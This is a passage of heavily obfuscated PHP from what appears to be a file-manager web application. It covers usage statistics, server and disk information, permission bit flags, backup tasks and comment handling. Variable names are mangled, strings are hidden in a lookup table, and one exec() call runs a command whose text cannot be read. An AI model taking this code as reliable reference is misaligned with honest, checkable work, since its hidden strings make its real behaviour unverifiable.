$Õ´ƒ¨ë£[461] => $this->typeLogCnt($Õ´ƒ¨ë£[461]), $Õ´ƒ¨ë£[1827] => $this->typeLogCnt($Õ´ƒ¨ë£[1827]), $Õ´ƒ¨ë£[1828] => $this->typeLogCnt($Õ´ƒ¨ë£[1828]), $Õ´ƒ¨ë£[609] => $this->typeLogCnt($Õ´ƒ¨ë£[12], $Õ´ƒ¨ë£[1803])); } private function typeLogCnt($À÷‚™¿ = '', $‚†éÙÂÚ = "\151\x64") { $¸ˆìîºÜ =& $_SERVER[Ü©»’·]; $ŞßØ½¦ï = array($¸ˆìîºÜ[107] => array($¸ˆìîºÜ[1829], $¸ˆìîºÜ[1830]), $¸ˆìîºÜ[461] => array($¸ˆìîºÜ[1831], $¸ˆìîºÜ[1832]), $¸ˆìîºÜ[1827] => array($¸ˆìîºÜ[1833], $¸ˆìîºÜ[1834], $¸ˆìîºÜ[1835]), $¸ˆìîºÜ[1828] => array($¸ˆìîºÜ[1836], $¸ˆìîºÜ[1837]), $¸ˆìîºÜ[1838] => array($¸ˆìîºÜ[1839], $¸ˆìîºÜ[1840], $¸ˆìîºÜ[1841])); $à¹¯•şÜ = strtotime(date($¸ˆìîºÜ[1799])); $ßèù ‰ = array($¸ˆìîºÜ[200] => array($¸ˆìîºÜ[1017], $à¹¯•şÜ)); if ($À÷‚™¿) { $ßèù ‰[$¸ˆìîºÜ[33]] = array($¸ˆìîºÜ[7], $ŞßØ½¦ï[$À÷‚™¿]); } $¹‡¶‰ÔŠ = Model($¸ˆìîºÜ[1802])->where($ßèù ‰)->count($‚†éÙÂÚ); return (int) $¹‡¶‰ÔŠ; } private function optionServer() { $´©û‹èğ =& $_SERVER[Ü©»’·]; $™åİÒâØ = $this->diskDriver(); $¶˜³¸¦Ë = KodIO::defaultDriver(); $†¦–‘Ú• = array($´©û‹èğ[823] => $¶˜³¸¦Ë[$´©û‹èğ[408]]); $£üôûğİ = Model($´©û‹èğ[480])->where($†¦–‘Ú•)->sum($´©û‹èğ[76]); $¯øÉ÷´ = explode($´©û‹èğ[53], $_SERVER[$´©û‹èğ[143]]); $Ü“å£Ç¶ = $¯øÉ÷´[0]; $ùÜ›¨„Î = $GLOBALS[$´©û‹èğ[6]][$´©û‹èğ[21]]; $ñÃ¥Ø²„ = $ùÜ›¨„Î[$´©û‹èğ[979]]; if ($ñÃ¥Ø²„ == $´©û‹èğ[967]) { $¯…ˆ‰çÅ = explode($´©û‹èğ[1283], $ùÜ›¨„Î[$´©û‹èğ[978]]); $ñÃ¥Ø²„ = $¯…ˆ‰çÅ[0]; } if ($ñÃ¥Ø²„ == $´©û‹èğ[915] || $ñÃ¥Ø²„ == $´©û‹èğ[810]) { $°èš×ì¤ = Model()->db()->query($´©û‹èğ[1842]); $ò‰Œµ¢ê = $°èš×ì¤[0] && isset($°èš×ì¤[0][$´©û‹èğ[1566]]) ? $°èš×ì¤[0][$´©û‹èğ[1566]] : 0; $ñÃ¥Ø²„ = $´©û‹èğ[1843] . ($ò‰Œµ¢ê ? $´©û‹èğ[8] . $ò‰Œµ¢ê : $´©û‹èğ[12]); } $˜äÏş¿ = $GLOBALS[$´©û‹èğ[6]][$´©û‹èğ[349]][$´©û‹èğ[833]]; return array($´©û‹èğ[1844] => $™åİÒâØ ? $™åİÒâØ[$´©û‹èğ[1845]] : 0, $´©û‹èğ[1846] => $™åİÒâØ ? $™åİÒâØ[$´©û‹èğ[1847]] : 0, $´©û‹èğ[1848] => (int) $¶˜³¸¦Ë[$´©û‹èğ[1845]] * 1024 * 1024 * 1024, $´©û‹èğ[1849] => (int) $£üôûğİ, $´©û‹èğ[1850] => ucfirst($Ü“å£Ç¶), $´©û‹èğ[1851] => $´©û‹èğ[1852] . PHP_VERSION, $´©û‹èğ[1853] => phpBuild64() ? 64 : 32, $´©û‹èğ[764] => str_replace($´©û‹èğ[1133], $´©û‹èğ[995], $ñÃ¥Ø²„), $´©û‹èğ[349] => ucfirst($˜äÏş¿), $´©û‹èğ[32] => $_SERVER[$´©û‹èğ[1854]]); } private function diskDriver() { $Ôş×Ç‡ï =& $_SERVER[Ü©»’·]; $âÛëª¿… = $Ôş×Ç‡ï[8]; $è­¬¤¬ü = $GLOBALS[$Ôş×Ç‡ï[6]][$Ôş×Ç‡ï[1300]] == $Ôş×Ç‡ï[1301]; if ($è­¬¤¬ü) { $âÛëª¿… = $Ôş×Ç‡ï[1855]; if (function_exists($Ôş×Ç‡ï[1856])) { exec($Ôş×Ç‡ï[1857], $é¦ıŒÏ); $âÛëª¿… = $é¦ıŒÏ[1] . $Ôş×Ç‡ï[8]; } } if (!file_exists($âÛëª¿…)) { return; } $ÎÕ¹Úû = @disk_total_space($âÛëª¿…); $Àôãâ¿¤ = $ÎÕ¹Úû - @disk_free_space($âÛëª¿…); return array($Ôş×Ç‡ï[1845] => $ÎÕ¹Úû, $Ôş×Ç‡ï[1847] => $Àôãâ¿¤); } public function fileChart($œ…ú±²û) { $ã’øçŠ =& $_SERVER[Ü©»’·]; if (isset($œ…ú±²û[$ã’øçŠ[1669]])) { return Model($ã’øçŠ[831])->userFileTypeProfile($œ…ú±²û[$ã’øçŠ[1669]]); } if (isset($œ…ú±²û[$ã’øçŠ[1858]])) { return Model($ã’øçŠ[831])->groupFileTypeProfile($œ…ú±²û[$ã’øçŠ[1858]]); } $ŒûùµÕ = $this->sourceSize(); $åêù°˜ = array($ã’øçŠ[441] => 0, $ã’øçŠ[420] => 1); $†”Í‹¡· = Model($ã’øçŠ[831])->where($åêù°˜)->sum($ã’øçŠ[76]); $åêù°˜[$ã’øçŠ[420]] = 2; $‚ÃÌò×É = Model($ã’øçŠ[831])->where($åêù°˜)->sum($ã’øçŠ[76]); return array($ã’øçŠ[769] => $ŒûùµÕ[$ã’øçŠ[76]], $ã’øçŠ[1792] => $ŒûùµÕ[$ã’øçŠ[1792]], $ã’øçŠ[1793] => (int) $†”Í‹¡·, $ã’øçŠ[1794] => (int) $‚ÃÌò×É); } private function sourceSize() { $Í€ò¼ı =& $_SERVER[Ü©»’·]; $Ş¶Ó™°· = Model($Í€ò¼ı[831])->where(array($Í€ò¼ı[419] => 0))->sum($Í€ò¼ı[76]); $±…ÊÅåğ = Model($Í€ò¼ı[480])->sum($Í€ò¼ı[76]); if ($±…ÊÅåğ > $Ş¶Ó™°·) { $±…ÊÅåğ = $Ş¶Ó™°·; } return array($Í€ò¼ı[76] => (int) $Ş¶Ó™°·, $Í€ò¼ı[1792] => (int) $±…ÊÅåğ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ˆæÒáğ =& $_SERVER[Ü©»’·]; $¢¼òÄ±ı = array(array($ˆæÒáğ[429] => LNG($ˆæÒáğ[1859]), $ˆæÒáğ[1860] => $ˆæÒáğ[1861], $ˆæÒáğ[1862] => 1, $ˆæÒáğ[1863] => 1, $ˆæÒáğ[1864] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆæÒáğ[429] => LNG($ˆæÒáğ[1865]), $ˆæÒáğ[1860] => $ˆæÒáğ[1866], $ˆæÒáğ[1862] => 2, $ˆæÒáğ[1863] => 1, $ˆæÒáğ[1864] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆæÒáğ[429] => LNG($ˆæÒáğ[1867]), $ˆæÒáğ[1860] => $ˆæÒáğ[1868], $ˆæÒáğ[1862] => 3, $ˆæÒáğ[1863] => 1, $ˆæÒáğ[1864] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆæÒáğ[429] => LNG($ˆæÒáğ[1869]), $ˆæÒáğ[1860] => $ˆæÒáğ[1870], $ˆæÒáğ[1862] => 4, $ˆæÒáğ[1863] => 1, $ˆæÒáğ[1864] => self::AUTH_SHOW | self::AUTH_VIEW), array($ˆæÒáğ[429] => LNG($ˆæÒáğ[1871]), $ˆæÒáğ[1860] => $ˆæÒáğ[1872], $ˆæÒáğ[1862] => 5, $ˆæÒáğ[1863] => 1, $ˆæÒáğ[1864] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ˆæÒáğ[429] => LNG($ˆæÒáğ[1873]), $ˆæÒáğ[1860] => $ˆæÒáğ[1874], $ˆæÒáğ[1862] => 6, $ˆæÒáğ[1863] => 1, $ˆæÒáğ[1864] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ˆæÒáğ[429] => LNG($ˆæÒáğ[1875]), $ˆæÒáğ[1860] => $ˆæÒáğ[1876], $ˆæÒáğ[1862] => 7, $ˆæÒáğ[1863] => 1, $ˆæÒáğ[1864] => 0)); return $¢¼òÄ±ı; } public static function authCheck($–ıîúÆ, $æù„˜ˆ’) { $’ÚÔíê¼ =& $_SERVER[Ü©»’·]; $–ıîúÆ = intval($–ıîúÆ); if ($GLOBALS[$’ÚÔíê¼[512]] && $GLOBALS[$’ÚÔíê¼[6]][$’ÚÔíê¼[1877]]) { return !0; } if ($–ıîúÆ <= 0) { return !1; } if (($–ıîúÆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($–ıîúÆ & $æù„˜ˆ’); } public static function authCheckShow($ÂèØ·Ù) { return self::authCheck($ÂèØ·Ù, self::AUTH_SHOW); } public static function authCheckView($†ä¯ô´ã) { return self::authCheck($†ä¯ô´ã, self::AUTH_VIEW); } public static function authCheckDownload($¿ÂÑàš‚) { return self::authCheck($¿ÂÑàš‚, self::AUTH_DOWNLOAD); } public static function authCheckUpload($õõ¥«‰­) { return self::authCheck($õõ¥«‰­, self::AUTH_UPLOAD); } public static function authCheckEdit($ó¤é¿£¢) { return self::authCheck($ó¤é¿£¢, self::AUTH_EDIT); } public static function authCheckRemove($‘†§±‡¥) { return self::authCheck($‘†§±‡¥, self::AUTH_REMOVE); } public static function authCheckShare($şÃÍ‹ÔÔ) { return self::authCheck($şÃÍ‹ÔÔ, self::AUTH_SHARE); } public static function authCheckComment($²´² ÔÊ) { return self::authCheck($²´² ÔÊ, self::AUTH_COMMENT); } public static function authCheckEvent($í®àÃ•±) { return self::authCheck($í®àÃ•±, self::AUTH_EVENT); } public static function authCheckRoot($‡áµ¸í) { return self::authCheck($‡áµ¸í, self::AUTH_ROOT); } public static function authCheckAction($Ûñ¦Ï·», $Í£°Ú±ü) { $Æ½ë‰ä =& $_SERVER[Ü©»’·]; $É ³›Âä = array($Æ½ë‰ä[1878] => self::AUTH_VIEW, $Æ½ë‰ä[1198] => self::AUTH_DOWNLOAD, $Æ½ë‰ä[107] => self::AUTH_UPLOAD, $Æ½ë‰ä[1828] => self::AUTH_EDIT, $Æ½ë‰ä[1827] => self::AUTH_REMOVE, $Æ½ë‰ä[1838] => self::AUTH_SHARE, $Æ½ë‰ä[354] => self::AUTH_COMMENT, $Æ½ë‰ä[1657] => self::AUTH_EVENT, $Æ½ë‰ä[1879] => self::AUTH_ROOT); if (!isset($É ³›Âä[$Í£°Ú±ü])) { return; } $ŸÆ¢€Æ² = $É ³›Âä[$Í£°Ú±ü]; $Ûñ¦Ï·» = intval($Ûñ¦Ï·»); if ($Ûñ¦Ï·» <= 0) { return !1; } if (($Ûñ¦Ï·» & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ûñ¦Ï·» & $ŸÆ¢€Æ²); } public static function authDisable($é†ƒé¶×, $˜×¹¿ãÀ) { if (intval($é†ƒé¶×) <= 0) { return 0; } return intval($é†ƒé¶×) & ~$˜×¹¿ãÀ; } public $optionType = "\123\171\163\164\145\155\x2e\163\x6f\165\162\143\x65\101\x75\164\x68\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x61\x75\164\x68", "\x6c\141\x62\x65\x6c", "\x64\x69\163\x70\x6c\x61\x79", "\163\171\x73\164\x65\155", "\x73\157\x72\164"); public function initData() { $”¾¹ ©Ï = $this->authDefault(); foreach ($”¾¹ ©Ï as $Ïüç¶ı‰) { $this->add($Ïüç¶ı‰); } } public function findAuth($Ô˜Ğ™íù, $¶Îœöèš) { $Ç£¦Õáû =& $_SERVER[Ü©»’·]; $¿–ÀÚ²ø = parent::listData(); foreach ($¿–ÀÚ²ø as $Ğë•³í½) { $Øí”ƒ®Å = intval($Ğë•³í½[$Ç£¦Õáû[422]]); if ($Øí”ƒ®Å <= 0 || $Ğë•³í½[$Ç£¦Õáû[1880]] == 0) { continue; } if (($Øí”ƒ®Å & $Ô˜Ğ™íù) != $Ô˜Ğ™íù) { continue; } if (($Øí”ƒ®Å & $¶Îœöèš) != 0) { continue; } return $Ğë•³í½[$Ç£¦Õáû[408]]; } return !1; } public function findAuthReadOnly() { $ùªşÓ—ö = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ûã®” = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ùªşÓ—ö, $Ûã®”); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ú“—„ =& $_SERVER[Ü©»’·]; $ƒ‘…—Ï— = parent::listData(); $çæ÷Ø´’ = !1; foreach ($ƒ‘…—Ï— as $€›Æû–¾) { if ($€›Æû–¾[$ú“—„[422]] <= 0 || $€›Æû–¾[$ú“—„[1880]] == $ú“—„[197]) { continue; } if (!$çæ÷Ø´’) { $çæ÷Ø´’ = $€›Æû–¾; continue; } if ($çæ÷Ø´’[$ú“—„[422]] > $€›Æû–¾[$ú“—„[422]]) { $çæ÷Ø´’ = $€›Æû–¾; } } return $çæ÷Ø´’ ? $çæ÷Ø´’[$ú“—„[408]] : $ú“—„[12]; } public function listData($‡Ó©õñü = false, $ĞÜ»Î = "\x73\157\162\x74", $å‹Ó“ŸŞ = false) { return parent::listData($‡Ó©õñü, $ĞÜ»Î, $å‹Ó“ŸŞ); } public function update($˜ÃŸŞ¯, $¥øÕ­’) { $ÎÖ¡…’ =& $_SERVER[Ü©»’·]; $Õá¡¥ Á = parent::listData($˜ÃŸŞ¯); $åĞ±òü‰ = $this->findByName($¥øÕ­’[$ÎÖ¡…’[32]]); if (!$Õá¡¥ Á || $åĞ±òü‰ && $åĞ±òü‰[$ÎÖ¡…’[408]] != $Õá¡¥ Á[$ÎÖ¡…’[408]]) { return !1; } $this->filterAuth($¥øÕ­’[$ÎÖ¡…’[422]]); return parent::update($˜ÃŸŞ¯, $¥øÕ­’); } public function remove($‡ šè¾·) { $–İéîª” = parent::listData($‡ šè¾·); if (!$–İéîª” || $–İéîª”[$_SERVER[Ü©»’·][1288]]) { return !1; } return parent::remove($‡ šè¾·); } public function add($ÌÍÙµàı = array()) { $„Íâ ¼˜ =& $_SERVER[Ü©»’·]; if ($this->findByName($ÌÍÙµàı[$„Íâ ¼˜[32]])) { return !1; } $í€Í¡œ = array($„Íâ ¼˜[32] => $„Íâ ¼˜[12], $„Íâ ¼˜[422] => 1, $„Íâ ¼˜[1881] => $„Íâ ¼˜[1868], $„Íâ ¼˜[1880] => 1, $„Íâ ¼˜[1288] => 0, $„Íâ ¼˜[1882] => 0); $ÌÍÙµàı = array_merge($í€Í¡œ, $ÌÍÙµàı); $ÌÍÙµàı[$„Íâ ¼˜[1882]] = $this->getSort(); $this->filterAuth($ÌÍÙµàı[$„Íâ ¼˜[422]]); return parent::insert($ÌÍÙµàı); } private function getSort() { $İÆÈ¶«Ã =& $_SERVER[Ü©»’·]; $Öå×à‘à = parent::listData(); $Âİ…Ğİª = array_to_keyvalue($Öå×à‘à, $İÆÈ¶«Ã[12], $İÆÈ¶«Ã[1882]); return empty($Âİ…Ğİª) ? 0 : max($Âİ…Ğİª) + 1; } private function filterAuth(&$öñŸãè‘) { if (!$öñŸãè‘) { return; } $€ªÃ¢ä¥ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÜÜé‘’— = array(); foreach ($€ªÃ¢ä¥ as $Ş¼óÅû·) { if ($öñŸãè‘ & $Ş¼óÅû·) { $ÜÜé‘’—[] = $Ş¼óÅû·; } } if (in_array(self::AUTH_ROOT, $ÜÜé‘’—)) { $öñŸãè‘ = array_sum($€ªÃ¢ä¥); return; } $¯ÄÇ½ÕØ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÜÜé‘’— as $Ş¼óÅû·) { if (isset($¯ÄÇ½ÕØ[$Ş¼óÅû·])) { $ÜÜé‘’— = array_merge($ÜÜé‘’—, $¯ÄÇ½ÕØ[$Ş¼óÅû·]); } } $ÜÜé‘’—[] = self::AUTH_SHOW; $öñŸãè‘ = array_sum(array_unique($ÜÜé‘’—)); } public function sort($Ú´è‹ªÈ, $ƒıÇáİ) { return parent::update($Ú´è‹ªÈ, $ƒıÇáİ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\142\141\143\x6b\x75\x70\x4c\x69\x73\x74"; public $field = array("\x69\157", "\156\x61\x6d\x65", "\163\164\x61\164\x75\x73", "\x63\x6f\156\164\x65\156\x74", "\x6d\x61\156\x75\141\154", "\162\145\163\x75\154\164", "\164\151\155\x65\106\x72\x6f\155", "\x74\x69\155\x65\124\157"); public function config() { $ÃŞÓßªç =& $_SERVER[Ü©»’·]; $‰òş†çü = Model($ÃŞÓßªç[776])->get($ÃŞÓßªç[786]); $‰òş†çü = json_decode($‰òş†çü, !0); $‰òş†çü = is_array($‰òş†çü) ? $‰òş†çü : array(); if (!isset($‰òş†çü[$ÃŞÓßªç[761]])) { $‰òş†çü[$ÃŞÓßªç[761]] = $ÃŞÓßªç[88]; } unset($‰òş†çü[$ÃŞÓßªç[1639]]); Action($ÃŞÓßªç[1883])->taskInit(); Model($ÃŞÓßªç[1638])->cacheClear(); $ıÍ´åï = $ÃŞÓßªç[1884]; $êê•È¤» = Model($ÃŞÓßªç[1885])->findByKey($ÃŞÓßªç[1657], $ıÍ´åï); if (!$êê•È¤») { $êê•È¤» = array(); } if (isset($êê•È¤»[$ÃŞÓßªç[203]])) { $êê•È¤»[$ÃŞÓßªç[203]] = json_decode($êê•È¤»[$ÃŞÓßªç[203]], !0); } if (isset($‰òş†çü[$ÃŞÓßªç[203]])) { $êê•È¤»[$ÃŞÓßªç[203]][$ÃŞÓßªç[1642]] = $‰òş†çü[$ÃŞÓßªç[203]]; unset($‰òş†çü[$ÃŞÓßªç[203]]); } return array_merge($êê•È¤», $‰òş†çü); } public function listData($¨šç¼Ïö = false, $ÇõØè­ = "\x6d\157\x64\151\x66\x79\124\151\x6d\x65", $¹ºªé“Ô = false) { return parent::listData($¨šç¼Ïö, $ÇõØè­, !0); } public function lastItem() { $ÊÀú‚ÌÒ = $this->listData(); return !empty($ÊÀú‚ÌÒ[0]) ? $ÊÀú‚ÌÒ[0] : null; } public function kill($ÄÀ°¯ß) { $¨ÒƒßèÂ =& $_SERVER[Ü©»’·]; $‚ÁŞ€‚û = $this->listData($ÄÀ°¯ß); if (!$‚ÁŞ€‚û || empty($‚ÁŞ€‚û[$¨ÒƒßèÂ[32]])) { return !0; } Task::kill($¨ÒƒßèÂ[785]); Task::kill($¨ÒƒßèÂ[806]); Task::kill($¨ÒƒßèÂ[815]); $­š¬ŒÖ = $‚ÁŞ€‚û[$¨ÒƒßèÂ[32]]; $–ˆ±İ¨ª = TEMP_FILES . $¨ÒƒßèÂ[784] . $­š¬ŒÖ . $¨ÒƒßèÂ[8]; IO::remove($–ˆ±İ¨ª, !1); return $this->remove($ÄÀ°¯ß); } public function remove($ğÔ¬°É) { $ñø¹°å‡ = $this->listData($ğÔ¬°É); if (!$ñø¹°å‡) { return !0; } return $this->backupRemove($ñø¹°å‡); } private function backupRemove($Œ–¯§Ğ÷) { parent::remove($Œ–¯§Ğ÷[$_SERVER[Ü©»’·][408]]); $å®ÑÃ·Ş = $this->backupPath($Œ–¯§Ğ÷); IO::remove($å®ÑÃ·Ş, !1); return !0; } private function backupPath($åÎ‚Á˜ş) { $íÌ’¹» =& $_SERVER[Ü©»’·]; $Á³öİô² = $åÎ‚Á˜ş[$íÌ’¹»[32]]; $€§Òå = Model($íÌ’¹»[776])->get($íÌ’¹»[777]); $Õ­©÷„  = substr(md5($íÌ’¹»[778] . $€§Òå . $Á³öİô²), 0, 8); return "\173\x69\157\x3a{$åÎ‚Á˜ş[$íÌ’¹»[758]]}\175\x2f\x64\141\x74\x61\x62\x61\163\145\x2f\142\x61\x63\153\165\x70\57" . $Á³öİô² . $íÌ’¹»[11] . $Õ­©÷„ ; } public function start() { $ôÈÜ¡Ã =& $_SERVER[Ü©»’·]; if ($GLOBALS[$ôÈÜ¡Ã[6]][$ôÈÜ¡Ã[89]][$ôÈÜ¡Ã[1886]] != $ôÈÜ¡Ã[88]) { return !0; } $ªÙÛ¸û± = $this->config(); if (!$ªÙÛ¸û± || $ªÙÛ¸û±[$ôÈÜ¡Ã[1639]] != $ôÈÜ¡Ã[88]) { return !1; } $Œ¥Š²¸ = $this->process(); foreach ($Œ¥Š²¸ as $–Ñ›°ë) { if ($–Ñ›°ë) { return Task::restart($–Ñ›°ë[$ôÈÜ¡Ã[408]]); } } $Ù“Ìå×ø = new Backup(); $®¹ø“Ìì = $Ù“Ìå×ø->db(); if ($®¹ø“Ìì) { $®¹ø“Ìì = $Ù“Ìå×ø->dbFile(); if ($®¹ø“Ìì && $ªÙÛ¸û±[$ôÈÜ¡Ã[761]] == $ôÈÜ¡Ã[197]) { $®¹ø“Ìì = $Ù“Ìå×ø->file(); } } Backup::set(array($ôÈÜ¡Ã[756] => 1, $ôÈÜ¡Ã[506] => time())); return !0; } public function process() { $Àçç„¬Õ =& $_SERVER[Ü©»’·]; $¥Êë¿ÊÛ = array($Àçç„¬Õ[764] => Task::get($Àçç„¬Õ[785]), $Àçç„¬Õ[768] => Task::get($Àçç„¬Õ[806]), $Àçç„¬Õ[199] => Task::get($Àçç„¬Õ[815])); $³±Ëû•Ö = !1; foreach ($¥Êë¿ÊÛ as &$êâÈÉó) { if ($³±Ëû•Ö) { $êâÈÉó = !1; continue; } if ($êâÈÉó) { $•‚ığ = intval(_get($êâÈÉó, $Àçç„¬Õ[1674], 0)); if (time() - $•‚ığ > 7200) { Task::kill($êâÈÉó[$Àçç„¬Õ[408]]); $³±Ëû•Ö = !0; $êâÈÉó = !1; } } } return $¥Êë¿ÊÛ; } public function restore() { $º—¦€Ôí =& $_SERVER[Ü©»’·]; ActionCall($º—¦€Ôí[1063], !0, 1); ActionCall($º—¦€Ôí[1063], !0, 0); } } goto F®çÆµ¶ˆ; F®çÆµ¶ˆ: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\x61\x6d\x65" => "\x63\x6f\x6d\155\145\156\164\x5f\155\x65\x74\141", "\x6d\145\164\141\106\151\145\x6c\144" => "\x63\157\155\155\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($şñ­÷İş) { $ÚšÇ£Â„ =& $_SERVER[Ü©»’·]; if ($şñ­÷İş[$ÚšÇ£Â„[1887]]) { $“Ééû· = $this->where(array($ÚšÇ£Â„[1888] => $şñ­÷İş[$ÚšÇ£Â„[1887]]))->find(); if (!$“Ééû· || $“Ééû·[$ÚšÇ£Â„[420]] != $şñ­÷İş[$ÚšÇ£Â„[420]] || $“Ééû·[$ÚšÇ£Â„[514]] != $şñ­÷İş[$ÚšÇ£Â„[514]]) { return !1; } $this->where(array($ÚšÇ£Â„[1888] => $şñ­÷İş[$ÚšÇ£Â„[1887]]))->setAdd($ÚšÇ£Â„[1889], 1); } $şñ­÷İş[$ÚšÇ£Â„[1890]] = 0; $şñ­÷İş[$ÚšÇ£Â„[1889]] = 0; $şñ­÷İş[$ÚšÇ£Â„[756]] = 1; return $this->add($şñ­÷İş); } public function commentCount($‹£†¨¯€, $ß¹Ë¹åÌ, $À¸Ï±öŒ = false) { $×·‚—òÇ =& $_SERVER[Ü©»’·]; if (!$‹£†¨¯€) { return array(); } if (is_string($‹£†¨¯€) || is_int($‹£†¨¯€)) { $‹£†¨¯€ = array($‹£†¨¯€); } $èÖå•ºÄ = array($×·‚—òÇ[514], $×·‚—òÇ[1891] => $×·‚—òÇ[509]); $áÊÊæ¿ = array($×·‚—òÇ[514] => array($×·‚—òÇ[7], $‹£†¨¯€), $×·‚—òÇ[420] => $ß¹Ë¹åÌ); if ($À¸Ï±öŒ) { $áÊÊæ¿[$×·‚—òÇ[1669]] = $À¸Ï±öŒ; } $ŒÈöµ¹’ = $this->field($èÖå•ºÄ)->where($áÊÊæ¿)->group($×·‚—òÇ[514])->select(); return array_to_keyvalue($ŒÈöµ¹’, $×·‚—òÇ[514], $×·‚—òÇ[509]); } public function starTarget($÷¾åÛ‹£, $ß§ÂÖå½) { $÷Š’­ìª =& $_SERVER[Ü©»’·]; $İ•Œ‚¶Ã = $÷¾åÛ‹£ + self::TYPE_STAR_OFFSET; $ñŒçŠ„ø = array($÷Š’­ìª[1669] => USER_ID, $÷Š’­ìª[420] => $İ•Œ‚¶Ã, $÷Š’­ìª[514] => $ß§ÂÖå½); $Íúšµæå = $this->where($ñŒçŠ„ø)->find(); if ($Íúšµæå) { return $this->where(array($÷Š’­ìª[408] => $Íúšµæå[$÷Š’­ìª[408]]))->delete(); } $«àªÕé = array($÷Š’­ìª[1887] => 0, $÷Š’­ìª[1669] => USER_ID, $÷Š’­ìª[756] => 1, $÷Š’­ìª[761] => $÷Š’­ìª[12], $÷Š’­ìª[420] => $İ•Œ‚¶Ã, $÷Š’­ìª[514] => $ß§ÂÖå½, $÷Š’­ìª[1890] => 0, $÷Š’­ìª[1889] => 0); return $this->add($«àªÕé); } public function starTargetCount($®ÓÒ‘²Á, $ºğß˜Ğ) { $»»ÛÇê‚ =& $_SERVER[Ü©»’·]; $ƒ¾ÈÒ™ö = $ºğß˜Ğ + self::TYPE_STAR_OFFSET; $º“À¶ä” = $this->commentCount($®ÓÒ‘²Á, $ƒ¾ÈÒ™ö); $Øü÷È´Ğ = $this->commentCount($®ÓÒ‘²Á, $ƒ¾ÈÒ™ö, USER_ID); return array($»»ÛÇê‚[1892] => $º“À¶ä”, $»»ÛÇê‚[1893] => $Øü÷È´Ğ); } public function starTargetUserList($¥ÑÉ°ã, $ªŞ–Ï–À) { $ÚÖâ«æì =& $_SERVER[Ü©»’·]; $é€àÜ¡é = $¥ÑÉ°ã + self::TYPE_STAR_OFFSET; $¥áŠ²»ı = array($ÚÖâ«æì[514] => $ªŞ–Ï–À, $ÚÖâ«æì[420] => $é€àÜ¡é); $ö±©°¶³ = $this->where($¥áŠ²»ı)->count(); $Ö£øµ“Õ = array($ÚÖâ«æì[255] => $ö±©°¶³, $ÚÖâ«æì[1894] => array()); if (!$ö±©°¶³) { return $Ö£øµ“Õ; } $ÌÔ¹ÍÜÛ = $this->field($ÚÖâ«æì[1669])->where($¥áŠ²»ı)->limit(500)->select(); $ÌÔ¹ÍÜÛ = array_to_keyvalue($ÌÔ¹ÍÜÛ, $ÚÖâ«æì[12], $ÚÖâ«æì[1669]); $Ö£øµ“Õ[$ÚÖâ«æì[1894]] = Model($ÚÖâ«æì[522])->userListInfo($ÌÔ¹ÍÜÛ); return $Ö£øµ“Õ; } public function prasiseUserList($ï®¡«·) { $ë©ë´âÉ =& $_SERVER[Ü©»’·]; $ƒµ…Í’ò = array($ë©ë´âÉ[1895] => $ï®¡«·); $º±™ãì± = $this->where($ƒµ…Í’ò)->find(); $¡ï÷´”µ = _get($º±™ãì±, $ë©ë´âÉ[1890], 0); $™ÖçÓ³ = array($ë©ë´âÉ[255] => $¡ï÷´”µ, $ë©ë´âÉ[1894] => array()); if (!$¡ï÷´”µ) { return $™ÖçÓ³; } $ööÑï = Model($ë©ë´âÉ[1896])->field($ë©ë´âÉ[1669])->where($ƒµ…Í’ò)->limit(500)->select(); $ööÑï = array_to_keyvalue($ööÑï, $ë©ë´âÉ[12], $ë©ë´âÉ[1669]); $™ÖçÓ³[$ë©ë´âÉ[1894]] = 